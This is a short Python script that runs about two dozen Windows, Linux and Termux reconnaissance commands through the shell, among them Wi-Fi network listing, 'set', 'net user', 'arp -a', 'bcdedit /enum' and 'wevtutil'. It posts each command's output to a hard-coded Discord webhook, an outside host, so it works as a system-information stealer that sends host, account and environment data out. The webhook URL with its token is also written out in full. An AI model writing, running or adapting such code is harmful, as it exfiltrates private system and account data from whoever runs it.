import subprocess
import requests
import json

# List of commands
commands = [
    'netsh wlan show networks',
    'echo Hello, World!',
    'set',
    'for %i in (*.txt) do echo %i',
    'termux-info',
    'ip addr show',
    'traceroute google.com',
    'ls -l',
    'ps',
    'wmic cpu get caption',
    'net user',
    'hostname',
    'nslookup google.com',
    'arp -a',
    'cd /',
    'sfc /scannow',
    'bcdedit /enum',
    'wevtutil qe System',
    'driverquery',
    'termux-wake-lock',
    'fsutil',
    'timeout 5',
    'exit'
]

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(message):
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({'content': message})
    response = requests.post(webhook_url, headers=headers, data=payload)
    if response.status_code == 204:
        print(f"Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")

# Execute each command and send output to Discord webhook
for cmd in commands:
    print(f"Executing command: {cmd}")
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    output = result.stdout.strip()  # Remove any leading/trailing whitespace

    # Send output to Discord webhook
    send_to_discord(f"**Command:** `{cmd}`\n```{output}```")

    print("=" * 40)  # Separator between command outputs
